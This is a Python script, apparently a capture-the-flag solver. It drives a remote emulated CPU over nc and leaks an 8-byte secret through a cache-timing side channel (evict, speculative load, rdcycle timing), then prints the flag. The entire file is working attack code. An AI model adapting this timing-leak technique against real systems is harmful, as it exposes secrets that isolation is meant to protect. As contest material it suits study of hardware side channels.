#!/usr/bin/env python3

import subprocess
import re


def probe_byte(byte_idx, known_lower):
    for guess in range(256):
        ptr = (guess << 8) | known_lower

        if ptr <= 7:
            continue

        ptr_index = (ptr >> 1) & 0x3FFF
        ptr_tag = ptr >> 15
        evict_tag = 1 - ptr_tag
        evict_addr = (evict_tag << 15) | (ptr_index << 1)

        if evict_addr <= 7:
            evict_addr = evict_addr ^ 0x8000

        commands = f"""reset
custom
mov r1 0x{evict_addr:04X}
ldb r2 r1
mov r3 8
mov r4 0
stb r4 r3
mov r5 {byte_idx}
ldbi r6 r5
halt
EOP
custom
mov r7 0x{evict_addr:04X}
rstcycle
rdcycle r8
ldb r9 r7
rdcycle r10
sub r11 r10 r8
halt
EOP
exit
"""

        try:
            result = subprocess.run(
                ["nc", "-w", "5", "172.105.60.118", "9999"],
                input=commands.encode(),
                capture_output=True,
                timeout=15,
            )
            output = result.stdout.decode(errors="replace")

            r11_matches = re.findall(r"r11\s*=\s*0x([0-9A-Fa-f]+)", output)

            if r11_matches:
                timing = int(r11_matches[-1], 16)
                if timing > 100:
                    return guess
        except:
            pass

    return 0


def main():
    leaked = [None] * 8

    leaked[7] = probe_byte(7, 0)
    print(f"SECRET[7] = 0x{leaked[7]:02X}")

    for i in range(6, -1, -1):
        leaked[i] = probe_byte(i, leaked[i + 1])
        print(f"SECRET[{i}] = 0x{leaked[i]:02X}")

    hex_str = "".join(f"{b:02X}" for b in leaked)
    print(f"\nparsec{{h4rdw4r3_in53cur1ty_0x{hex_str}}}")


if __name__ == "__main__":
    main()
